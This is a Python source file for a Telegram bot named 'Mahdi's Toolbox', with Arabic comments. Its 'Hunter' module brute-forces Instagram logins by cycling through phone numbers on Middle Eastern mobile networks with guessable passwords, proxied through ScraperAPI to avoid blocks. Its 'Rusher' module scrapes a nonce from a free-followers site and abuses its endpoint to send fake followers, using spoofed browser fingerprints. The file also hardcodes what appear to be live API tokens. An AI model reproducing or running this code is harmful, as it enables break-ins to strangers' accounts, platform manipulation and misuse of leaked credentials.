# ==============================================================================
#  MAHDI'S TOOLBOX - v5 (Double Agent Edition)
# ==============================================================================
import os
import requests
import random
import time
import threading
import json
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from bs4 import BeautifulSoup
import re

# --- إعدادات أساسية ---
TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
CHAT_ID = "1148797883"
SCRAPER_API_KEY = "da54f75953fed511420acb3003111fa0"

# --- متغيرات الحالة العامة ---
current_task = "idle"
is_running = False
hits = 0
fails = 0
last_event = "Toolbox is idle."
start_time = None
current_target = "None"
network_map = {
    '1': ("Asia (Iraq)", "964", "077"), '2': ("Zain (Iraq)", "964", "078"),
    '3': ("Libya (091)", "218", "91"), '4': ("Libya (092)", "218", "92"),
    '5': ("MCI (Iran)", "98", "91"), '6': ("Irancell (Iran)", "98", "93"),
    '7': ("Vodafone (Egypt)", "20", "10"), '8': ("Orange (Egypt)", "20", "12"),
    '9': ("Ooredoo (Kuwait)", "965", "6"), '10': ("Vodafone (Qatar)", "974", "77")
}
current_hunter_config = {}
hunter_progress = {}

# --- إعدادات Flask لخادم الويب ---
app = Flask(__name__)
@app.route('/')
def home():
    return "Toolbox bot is alive!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# --- دوال أداة فحص الحسابات (Hunter) ---
def load_hunter_progress():
    global hunter_progress
    try:
        with open("hunter_progress.json", "r") as f:
            hunter_progress = json.load(f)
    except FileNotFoundError:
        hunter_progress = {k: 0 for k in network_map.keys()}

def save_hunter_progress():
    with open("hunter_progress.json", "w") as f:
        json.dump(hunter_progress, f)

def hunter_worker():
    global hits, fails, last_event
    country_code = current_hunter_config["country"]
    prefix = current_hunter_config["prefix"]
    network_key = current_hunter_config["key"]
    
    while is_running:
        current_num = hunter_progress.get(network_key, 0)
        hunter_progress[network_key] = current_num + 1
        save_hunter_progress()
        
        phone_suffix = str(current_num).zfill(7)
        username = f"{country_code}{prefix}{phone_suffix}"
        password = f"{prefix}{phone_suffix}"
        
        try:
            target_url = 'https://i.instagram.com/api/v1/accounts/login/'
            payload = {
                'api_key': SCRAPER_API_KEY,
                'url': target_url,
                'method': 'POST',
                'body': f'username={username}&password={password}&queryParams=%7B%7D&optIntoOneTap=false',
                'headers': {
                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }
            response = requests.post('http://api.scraperapi.com', json=payload, timeout=45)

            if 'logged_in_user' in response.text:
                hits += 1
                last_event = f"🎯 HIT! @{username}"
                # Send Telegram message for hit
            else:
                fails += 1
                last_event = f"Checked @{username}"
        except Exception as e:
            fails += 1
            last_event = f"Hunter Error: {e}"
        
        time.sleep(2) # To avoid hitting API rate limits

# --- دوال أداة رشق المتابعين (Rusher) - The Double Agent ---
def create_double_agent_fingerprint():
    # إنشاء بصمة متصفح مزيفة ولكنها متسقة
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1'
    }

def rusher_worker(target_username):
    global hits, fails, last_event
    while is_running:
        try:
            # 1. إنشاء "العميل المزدوج" مع بصمته الخاصة
            agent_session = requests.Session()
            agent_session.headers.update(create_double_agent_fingerprint())

            # 2. الاستطلاع: سرقة "تذكرة الدخول" (_wpnonce)
            last_event = f"Scouting {target_username}..."
            page_url = "https://superviral.io/free-instagram-followers/"
            
            # إرسال الطلب عبر ScraperAPI مع الحفاظ على بصمة العميل
            response_page = agent_session.get(f'http://api.scraperapi.com?api_key={SCRAPER_API_KEY}&url={page_url}', timeout=45)
            
            if response_page.status_code != 200:
                fails += 1; last_event = "Scouting failed."; time.sleep(5); continue

            soup = BeautifulSoup(response_page.content, 'html.parser')
            nonce_input = soup.find('input', {'name': '_wpnonce'})
            
            if not nonce_input or not nonce_input.get('value'):
                fails += 1; last_event = "Could not find nonce ticket."; time.sleep(5); continue
            
            nonce_ticket = nonce_input.get('value')
            last_event = "Nonce ticket acquired. Attacking..."

            # 3. الهجوم: استخدام "تذكرة الدخول" لإرسال طلب الرشق
            random_email = f"user{random.randint(10000, 99999)}@example.com"
            api_url = "https://superviral.io/wp-admin/admin-ajax.php"
            
            payload = {
                'action': 'get_free_followers',
                'username': target_username,
                'email': random_email,
                '_wpnonce': nonce_ticket
            }
            
            # إرسال الطلب الثاني عبر ScraperAPI بنفس بصمة العميل
            response_rush = agent_session.post(f'http://api.scraperapi.com?api_key={SCRAPER_API_KEY}&url={api_url}', data=payload, timeout=45)

            if response_rush.status_code == 200 and '"success":true' in response_rush.text.lower():
                hits += 1
                last_event = f"🚀 Followers sent to {target_username}!"
            else:
                fails += 1
                error_msg = response_rush.json().get('data', 'Unknown error') if response_rush.headers.get('Content-Type') == 'application/json' else 'Unknown error'
                last_event = f"Rush failed: {error_msg}"

            # انتظر فترة قبل المحاولة التالية لتجنب الحظر
            time.sleep(60)

        except Exception as e:
            fails += 1
            last_event = f"Rusher Error: {e}"
            time.sleep(10)

# --- المدير العام للمهام ---
def main_task_manager(task_type, target):
    global is_running, start_time, current_target, hits, fails, last_event, current_task, current_hunter_config
    
    is_running = True
    current_task = task_type
    start_time = time.time()
    current_target = target
    hits, fails = 0, 0
    worker_threads = []

    if task_type == "hunting":
        load_hunter_progress()
        network_info = network_map[target]
        current_hunter_config = {"key": target, "name": network_info[0], "country": network_info[1], "prefix": network_info[2]}
        current_target = network_info[0]
        worker_threads = [threading.Thread(target=hunter_worker) for _ in range(5)]
    elif task_type == "rushing":
        worker_threads = [threading.Thread(target=rusher_worker, args=(target,))]
    
    for t in worker_threads: t.start()

# --- دوال بوت التيليجرام (الواجهة الرئيسية) ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🕵️‍♂️ فحص الحسابات", callback_data='select_hunting')],
        [InlineKeyboardButton("🚀 رشق المتابعين", callback_data='select_rushing')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('🤖 Welcome to Mahdi\'s Toolbox! Choose a task:', reply_markup=reply_markup)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, current_task
    if not is_running:
        await update.message.reply_text("No task is currently running.")
        return
    is_running = False
    current_task = "idle"
    await update.message.reply_text("🛑 Stopping current task... Please wait for workers to finish their current cycle.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = "N/A"
    if start_time:
        uptime_seconds = int(time.time() - start_time)
        minutes, seconds = divmod(uptime_seconds, 60)
        uptime = f"{minutes:02}:{seconds:02}"

    speed = 0
    if start_time and (hits + fails) > 0:
        elapsed = time.time() - start_time
        speed = (hits + fails) / elapsed * 60 if elapsed > 0 else 0

    task_name = "Idle"
    if current_task == "hunting": task_name = "Hunting"
    elif current_task == "rushing": task_name = "Rushing"

    status_msg = (
        f"📊 *Toolbox Status* 📊\n"
        f"--------------------------------\n"
        f"⚙️ *Task:* {task_name}\n"
        f"🎯 *Target:* {current_target}\n"
        f"⏳ *Uptime:* {uptime}\n"
        f"--------------------------------\n"
        f"✅ *Hits:* {hits}\n"
        f"❌ *Fails:* {fails}\n"
        f"⚡️ *Speed:* {speed:.1f} attempts/min\n"
        f"--------------------------------\n"
        f"💬 *Last Event:* {last_event}"
    )
    await update.message.reply_text(status_msg, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if is_running:
        await query.edit_message_text(text="⚠️ A task is already running. Use /stop to stop it first.")
        return

    if query.data == 'select_hunting':
        keyboard = [[InlineKeyboardButton(v[0], callback_data=f'hunt_{k}')] for k, v in network_map.items()]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text="🕵️‍♂️ Select a network to hunt:", reply_markup=reply_markup)
    
    elif query.data == 'select_rushing':
        context.user_data['next_action'] = 'rushing_username'
        await query.edit_message_text(text="🚀 Please send the Instagram username you want to target.")

    elif query.data.startswith('hunt_'):
        network_key = query.data.split('_')[1]
        network_name = network_map[network_key][0]
        await query.edit_message_text(text=f"🕵️‍♂️ Starting hunt for {network_name}...")
        thread = threading.Thread(target=main_task_manager, args=("hunting", network_key))
        thread.start()

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('next_action') == 'rushing_username':
        username = update.message.text.strip().replace('@', '')
        if not re.match(r'^[a-zA-Z0-9._]{1,30}$', username):
            await update.message.reply_text("Invalid username. Please send a valid Instagram username.")
            return
        
        context.user_data['next_action'] = None
        await update.message.reply_text(f"🚀 Starting to rush followers for @{username}...")
        thread = threading.Thread(target=main_task_manager, args=("rushing", username))
        thread.start()

# --- دالة التشغيل الرئيسية للبوت ---
def run_bot():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    print("Toolbox Bot is up and running...")
    application.run_polling()

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask); flask_thread.daemon = True; flask_thread.start()
    run_bot()
